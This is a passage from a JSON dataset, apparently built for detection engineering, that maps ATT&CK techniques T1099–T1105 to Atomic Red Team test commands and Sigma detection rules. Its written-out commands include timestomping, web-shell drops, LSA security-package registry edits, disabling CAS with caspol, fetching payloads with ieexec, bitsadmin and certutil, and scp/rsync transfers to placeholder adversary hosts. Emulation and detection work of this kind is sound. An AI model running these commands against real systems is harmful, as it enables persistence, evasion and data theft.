$env:TEMP\\T1099_timestomp.txt | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "Get-ChildItem #{file_path} | % { $_.LastAccessTime = \"1970-01-01 00:00:00\" }\n", "import-module $env:appdata\\Microsoft\\timestomp.ps1\ntimestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\"\n \n", "powershell/management/timestomp", "powershell/management/timestomp"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Unauthorized System Time Modification", "id": "faa031b5-21ed-4e02-8881-2591f98d82ed", "status": "experimental", "description": "Detect scenarios where a potentially unauthorized application or user is modifying the system time.", "author": "@neu5ron", "references": ["Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well)", "Live environment caused by malware"], "date": "2019/02/05", "tags": ["attack.defense_evasion", "attack.t1099"], "logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : System > Audit Security State Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security State Change"}, "detection": {"selection": {"EventID": 4616}, "filter1": {"ProcessName": "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"}, "filter2": {"ProcessName": "C:\\Windows\\System32\\VBoxService.exe"}, "filter3": {"ProcessName": "C:\\Windows\\System32\\svchost.exe", "SubjectUserSid": "S-1-5-19"}, "condition": "selection and not ( filter1 or filter2 or filter3 )"}, "falsepositives": ["HyperV or other virtualization technologies with binary not listed in filter portion of detection"], "level": "high"}}]}, {"technique_id": "T1100", "commands": [{"source": "atomics/T1100/T1100.yaml", "command": "xcopy #{web_shells} C:\\inetpub\\wwwroot\n", "name": null}, {"source": "atomics/T1100/T1100.yaml", "command": "xcopy PathToAtomicsFolder\\T1100\\src\\ #{web_shell_path}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "ieexec.exe http://*:8080/bypass.exe", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Web Shell": {"attack_technique": "T1100", "display_name": "Web Shell", "atomic_tests": [{"name": "Web Shell Written to Disk", "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n", "supported_platforms": ["windows"], "input_arguments": {"web_shell_path": {"description": "The path to drop the web shell", "type": "string", "default": "C:\\inetpub\\wwwroot"}, "web_shells": {"description": "Path of Web Shell", "type": "path", "default": "PathToAtomicsFolder\\T1100\\src\\"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Web shell must exist on disk at specified location (#{web_shells})\n", "prereq_command": "if (Test-Path #{web_shells}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp\" -OutFile \"#{web_shells}/test.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n"}], "executor": {"name": "command_prompt", "command": "xcopy #{web_shells} #{web_shell_path}\n", "cleanup_command": "del #{web_shell_path} >nul 2>&1\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100211", "os": "windows", "parent_process": "ieexec.exe", "commandline_string": "http://*:8080/bypass.exe", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "web_shell", "mitre_attack": "T1100", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md"}}], "command_list": ["xcopy #{web_shells} C:\\inetpub\\wwwroot\n", "xcopy PathToAtomicsFolder\\T1100\\src\\ #{web_shell_path}\n", "ieexec.exe http://*:8080/bypass.exe"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Antivirus Web Shell Detection", "id": "fdf135a2-9241-4f96-a114-bb404948f736", "description": "Detects a highly relevant Antivirus alert that reports a web shell", "date": "2018/09/09", "modified": "2019/10/04", "author": "Florian Roth", "references": ["https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/"], "tags": ["attack.persistence", "attack.t1100"], "logsource": {"product": "antivirus"}, "detection": {"selection": {"Signature": ["PHP/Backdoor*", "JSP/Backdoor*", "ASP/Backdoor*", "Backdoor.PHP*", "Backdoor.JSP*", "Backdoor.ASP*", "*Webshell*"]}, "condition": "selection"}, "fields": ["FileName", "User"], "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "Webshell Remote Command Execution", "id": "c0d3734d-330f-4a03-aae2-65dacc6a8222", "status": "experimental", "description": "Detects posible command execution by web application/web shell", "tags": ["attack.persistence", "attack.t1100"], "references": ["personal experience"], "author": "Ilyas Ochkov, Beyu Denis, oscd.community", "date": "2019/10/12", "modified": "2019/11/04", "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection": {"type": "SYSCALL", "SYSCALL": "execve", "key": "detect_execve_www"}, "condition": "selection"}, "falsepositives": ["Admin activity", "Crazy web applications"], "level": "critical"}}, {"data_source": {"title": "Windows webshell creation", "id": "39f1f9f2-9636-45de-98f6-a4046aa8e4b9", "status": "experimental", "description": "Posible webshell file creation on a static web site", "references": ["PT ESC rule and personal experience"], "author": "Beyu Denis, oscd.community", "date": "2019/10/22", "modified": "2019/11/04", "tags": ["attack.persistence", "attack.t1100"], "level": "critical", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection_1": {"EventID": 11}, "selection_2": {"TargetFilename|contains": "\\inetpub\\wwwroot\\"}, "selection_3": {"TargetFilename|contains": [".asp", ".ashx", ".ph"]}, "selection_4": {"TargetFilename|contains": ["\\www\\", "\\htdocs\\", "\\html\\"]}, "selection_5": {"TargetFilename|contains": ".ph"}, "selection_6": [{"TargetFilename|contains|all": ["\\", ".jsp"]}, {"TargetFilename|contains|all": ["\\cgi-bin\\", ".pl"]}], "condition": "selection_1 and ( selection_2 and selection_3 ) or selection_1 and ( selection_4 and selection_5 ) or selection_1 and selection_6"}, "falsepositives": ["Legitimate administrator or developer creating legitimate executable files in a web application folder"]}}, {"data_source": {"title": "Execution in Webserver Root Folder", "id": "35efb964-e6a5-47ad-bbcd-19661854018d", "status": "experimental", "description": "Detects a suspicious program execution in a web service root folder (filter out false positives)", "author": "Florian Roth", "tags": ["attack.persistence", "attack.t1100"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\wwwroot\\\\*", "*\\wmpub\\\\*", "*\\htdocs\\\\*"]}, "filter": {"Image": ["*bin\\\\*", "*\\Tools\\\\*", "*\\SMSComponent\\\\*"], "ParentImage": ["*\\services.exe"]}, "condition": "selection and not filter"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Various applications", "Tools that include ping or nslookup command invocations"], "level": "medium"}}, {"data_source": {"title": "IIS Native-Code Module Command Line Installation", "id": "9465ddf4-f9e4-4ebd-8d98-702df3a93239", "description": "Detects suspicious IIS native-code module installations via command line", "status": "experimental", "references": ["https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/"], "author": "Florian Roth", "modified": "2012/12/11", "tags": ["attack.persistence", "attack.t1100"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\APPCMD.EXE install module /name:*"]}, "condition": "selection"}, "falsepositives": ["Unknown as it may vary from organisation to arganisation how admins use to install IIS modules"], "level": "medium"}}, {"data_source": {"title": "Webshell Detection With Command Line Keywords", "id": "bed2a484-9348-4143-8a8a-b801c979301c", "description": "Detects certain command line parameters often used during reconnaissance activity via web shells", "author": "Florian Roth", "reference": ["https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html"], "date": "2017/01/01", "modified": "2019/10/26", "tags": ["attack.privilege_escalation", "attack.persistence", "attack.t1100"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\apache*", "*\\tomcat*", "*\\w3wp.exe", "*\\php-cgi.exe", "*\\nginx.exe", "*\\httpd.exe"], "CommandLine": ["*whoami*", "*net user *", "*ping -n *", "*systeminfo", "*&cd&echo*", "*cd /d*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Shells Spawned by Web Servers", "id": "8202070f-edeb-4d31-a010-a26c72ac5600", "status": "experimental", "description": "Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack", "author": "Thomas Patzke", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\w3wp.exe", "*\\httpd.exe", "*\\nginx.exe", "*\\php-cgi.exe"], "Image": ["*\\cmd.exe", "*\\sh.exe", "*\\bash.exe", "*\\powershell.exe"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.privilege_escalation", "attack.persistence", "attack.t1100"], "falsepositives": ["Particular web applications may spawn a shell process legitimately"], "level": "high"}}]}, {"technique_id": "T1101", "commands": [{"source": "atomics/T1101/T1101.yaml", "command": "# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"not-a-ssp\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "name": null}, {"source": "Threat Hunting Tables", "command": "caspol.exe -s off", "name": null}, {"source": "SysmonHunter - Security Support Provider", "command": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "name": null}, {"source": "SysmonHunter - Security Support Provider", "command": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/get_ssps", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/get_ssps", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/install_ssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/install_ssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/memssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/memssp", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Security Support Provider": {"attack_technique": "T1101", "display_name": "Security Support Provider", "atomic_tests": [{"name": "Modify SSP configuration in registry", "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.", "supported_platforms": ["windows"], "input_arguments": {"fake_ssp_dll": {"description": "Value added to registry key. Normally refers to a DLL name in C:\\Windows\\System32.", "type": "String", "default": "not-a-ssp"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"#{fake_ssp_dll}\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100212", "os": "windows", "parent_process": "caspol.exe", "commandline_string": "-s off", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "web_shell", "mitre_attack": "T1101", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md"}}, {"SysmonHunter - T1101": {"name": "Security Support Provider", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"}}}, {"type": "process", "process": {"cmdline": {"pattern": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/get_ssps", "ATT&CK Technique #1": "T1101", "ATT&CK Technique #2": "", "Technique": "Security Support Provider", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/get_ssps\":  [\"T1101\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/install_ssp", "ATT&CK Technique #1": "T1101", "ATT&CK Technique #2": "", "Technique": "Security Support Provider", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/install_ssp\":  [\"T1101\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/memssp", "ATT&CK Technique #1": "T1101", "ATT&CK Technique #2": "", "Technique": "Security Support Provider", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/memssp\":  [\"T1101\"],"}}], "command_list": ["# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"not-a-ssp\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "caspol.exe -s off", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "powershell/persistence/misc/get_ssps", "powershell/persistence/misc/get_ssps", "powershell/persistence/misc/install_ssp", "powershell/persistence/misc/install_ssp", "powershell/persistence/misc/memssp", "powershell/persistence/misc/memssp"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1102", "commands": [{"source": "atomics/T1102/T1102.yaml", "command": "bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "name": null}, {"source": "atomics/T1102/T1102.yaml", "command": "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Web Service": {"attack_technique": "T1102", "display_name": "Web Service", "atomic_tests": [{"name": "Reach out to C2 Pointer URLs via command_prompt", "description": "Download data from a public website using command line\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "cleanup_command": "del %TEMP%\\bitsadmindownload.html >nul 2>&1\n"}}, {"name": "Reach out to C2 Pointer URLs via powershell", "description": "Multiple download methods for files using powershell\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n", "cleanup_command": "Clear-Variable T1102 >$null 2>&1"}}]}}], "command_list": ["bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "CobaltStrike Malleable Amazon browsing traffic profile", "id": "953b895e-5cc9-454b-b183-7f3db555452e", "status": "experimental", "description": "Detects Malleable Amazon Profile", "references": ["https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile", "https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100"], "author": "Markus Neis", "tags": ["attack.t1102"], "logsource": {"category": "proxy"}, "detection": {"selection1": {"c-useragent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "cs-method": "GET", "c-uri": "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books", "cs-host": "www.amazon.com", "cs-cookie": "*=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996"}, "selection2": {"c-useragent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "cs-method": "POST", "c-uri": "/N4215/adj/amzn.us.sr.aps", "cs-host": "www.amazon.com"}, "condition": "selection1 or selection2"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "CobaltStrike Malleable (OCSP) Profile", "id": "37325383-740a-403d-b1a2-b2b4ab7992e7", "status": "experimental", "description": "Detects Malleable (OCSP) Profile with Typo (OSCP) in URL", "references": ["https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/ocsp.profile"], "author": "Markus Neis", "tags": ["attack.t1102"], "logsource": {"category": "proxy"}, "detection": {"selection": {"c-uri": "*/oscp/*", "cs-host": "ocsp.verisign.com"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "CobaltStrike Malleable OneDrive browsing traffic profile", "id": "c9b33401-cc6a-4cf6-83bb-57ddcb2407fc", "status": "experimental", "description": "Detects Malleable OneDrive Profile", "references": ["https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/onedrive_getonly.profile"], "author": "Markus Neis", "tags": ["attack.t1102"], "logsource": {"category": "proxy"}, "detection": {"selection": {"cs-method": "GET", "c-uri": "*?manifest=wac", "cs-host": "onedrive.live.com"}, "filter": {"c-uri": "http*://onedrive.live.com/*"}, "condition": "selection and not filter"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Raw Paste Service Access", "id": "5468045b-4fcc-4d1a-973c-c9c9578edacb", "status": "experimental", "description": "Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form", "references": ["https://www.virustotal.com/gui/domain/paste.ee/relations"], "author": "Florian Roth", "date": "2019/12/05", "tags": ["attack.t1102", "attack.defense_evasion"], "logsource": {"category": "proxy"}, "detection": {"selection": {"c-uri|contains": [".paste.ee/r/", ".pastebin.com/raw/", ".hastebin.com/raw/"]}, "condition": "selection"}, "fields": ["ClientIP", "c-uri", "c-useragent"], "falsepositives": ["User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste)"], "level": "high"}}]}, {"technique_id": "T1103", "commands": [{"source": "atomics/T1103/T1103.yaml", "command": "reg.exe import PathToAtomicsFolder\\T1103\\src\\T1103.reg\n", "name": null}, {"source": "atomics/T1103/T1103.yaml", "command": "reg.exe import #{registry_file}\n", "name": null}, {"source": "SysmonHunter - AppInit DLLs", "command": "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - AppInit DLLs": {"attack_technique": "T1103", "display_name": "AppInit DLLs", "atomic_tests": [{"name": "Install AppInit Shim", "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regular as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n", "supported_platforms": ["windows"], "input_arguments": {"registry_file": {"description": "Windows Registry File", "type": "Path", "default": "PathToAtomicsFolder\\T1103\\src\\T1103.reg"}, "registry_cleanup_file": {"description": "Windows Registry File", "type": "Path", "default": "PathToAtomicsFolder\\T1103\\src\\T1103-cleanup.reg"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n", "prereq_command": "if ((Test-Path #{registry_file}) -and (Test-Path #{registry_cleanup_file})) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{registry_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1103/src/T1103.reg\" -OutFile \"#{registry_file}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1103/src/T1103-cleanup.reg\" -OutFile \"#{registry_cleanup_file}\"\n"}, {"description": "DLL's must exist in the C:\\Tools directory (T1103.dll and T1103x86.dll)\n", "prereq_command": "if ((Test-Path c:\\Tools\\T1103.dll) -and (Test-Path c:\\Tools\\T1103x86.dll)) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory C:\\Tools -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1103/bin/T1103.dll\" -OutFile C:\\Tools\\T1103.dll\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1103/bin/T1103x86.dll\" -OutFile C:\\Tools\\T1103x86.dll\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg.exe import #{registry_file}\n", "cleanup_command": "reg.exe import #{registry_cleanup_file}\n"}}]}}, {"SysmonHunter - T1103": {"name": "AppInit DLLs", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs"}}}]}}], "command_list": ["reg.exe import PathToAtomicsFolder\\T1103\\src\\T1103.reg\n", "reg.exe import #{registry_file}\n", "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\Appinit_Dlls\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\Appinit_Dlls\\\\\")", "name": "AppInit DLLs"}], "possible_detections": []}, {"technique_id": "T1105", "commands": [{"source": "atomics/T1105/T1105.yaml", "command": "rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} #{username}@victim-host:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{username}@adversary-host:#{remote_path} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} #{username}@victim-host:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{username}@adversary-host:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@adversary-host:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} Atomic-license.txt\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"#{destination_path}\")\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"$env:TEMP\\Atomic-license.txt\")\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "pushd 